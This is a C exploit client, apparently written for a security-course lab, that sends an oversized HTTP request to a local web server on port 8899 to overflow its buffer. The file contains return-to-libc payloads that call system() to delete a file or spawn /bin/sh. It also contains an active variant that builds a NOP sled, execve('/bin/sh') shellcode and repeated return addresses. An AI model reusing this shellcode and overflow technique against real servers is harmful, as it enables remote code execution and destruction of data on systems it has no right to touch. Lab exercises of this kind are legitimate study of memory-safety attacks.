#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <sys/shm.h>

#define PORT  8899

int main(int argc, char *argv[])
{
  int  port = PORT;
  if (argc>1)
    port = atoi(argv[1]);

  int sock_client = socket(AF_INET,SOCK_STREAM, 0);//sock fd

  struct sockaddr_in addr;
  memset(&addr, 0, sizeof(addr));
  addr.sin_family = AF_INET;
  addr.sin_port = htons(port);  //server port

  addr.sin_addr.s_addr = inet_addr("127.0.0.1");  ///server ip address


  if (connect(sock_client, (struct sockaddr *)&addr, sizeof(addr)) < 0)
    {
      perror("connect");
      exit(1);
    }

  printf("sock_client = %d\n",sock_client);

  #define len 1300
  char req[len];
  memset(req,'A',len);
  req[len-4]='\r',
  req[len-3]='\n',
  req[len-2]='\r',
  req[len-1]='\n';
  //consruct your hack code here
  //but remember to keep the last 4 Byte unchanged.

#if 0
  //Remove a.txt，use tab"0x09" replacing space "0x20" to prevent teminating process.
    req[1060] = '\xd0';//system()
    req[1061] = '\x4c';
    req[1062] = '\xe5';
    req[1063] = '\xf7';

    req[1064] = '\xc0';//exit()
    req[1065] = '\x7e';
    req[1066] = '\xe4';
    req[1067] = '\xf7';

    req[1068] = '\x18';//link to 0xffffd418 where stored "rm\ta.txt"
    req[1069] = '\xd4';
    req[1070] = '\xff';
    req[1071] = '\xff';

    req[1072] = '\x72';//store "rm\ta.txt"
    req[1073] = '\x6d';
    req[1074] = '\x09';//tab, no space
    req[1075] = '\x61';
    req[1076] = '\x2e';
    req[1077] = '\x74';
    req[1078] = '\x78';
    req[1079] = '\x74';

    req[1080] = '\x00';//set 'null' as end of string
    req[1081] = '\x00';
    req[1082] = '\x00';
    req[1083] = '\x00';
#endif

#if 0
    //Pop a shell via environment variables.
    req[1060] = '\xd0';//system()
    req[1061] = '\x4c';
    req[1062] = '\xe5';
    req[1063] = '\xf7';

    req[1064] = '\xc0';//exit()
    req[1065] = '\x7e';
    req[1066] = '\xe4';
    req[1067] = '\xf7';

    req[1068] = '\x19';//link to environment variables where stored "/bin/sh"
    req[1069] = '\xd9';
    req[1070] = '\xff';
    req[1071] = '\xff';
#endif
#if 1
    //Brute_Force
    const char shellcode[] =
    "\x31\xc0"
    "\x50"
    "\x68""//sh"
    "\x68""/bin"
    "\x89\xe3"
    "\x50"
    "\x53"
    "\x89\xe1"
    "\x99"
    "\xb0\x0b"
    "\xcd\x80" ;

    long jmp_addr=(long)argv[2] ;//Repeat loop sending args of string's start address;
    char *ptr =req;
    long *addr_ptr = (long *)ptr;
    int i;

    for(i=0; i<len-6; i+=4)
        *(addr_ptr++) = jmp_addr;
    for(i=0; i<len/3; ++i)
        req[i] = 0x90;
    ptr =req +( (len/3) -strlen(shellcode)/2);
    for(i=0; i<strlen(shellcode); ++i)
        * (ptr++) = shellcode[i];

#endif
  //printf("[!!!]Implement your code here %s function: %s line: %d\n",__FILE__,__FUNCTION__,__LINE__);
  //exit(-1);

  write(sock_client,req,len);
  //receive the response from web server
  char resp[1024];
  int num = 0;
  while(read (sock_client, &resp[num], 1))
	num++;
  resp[num] = 0;
  printf("Response = %s\n",resp);

  close(sock_client);


 return 0;
}
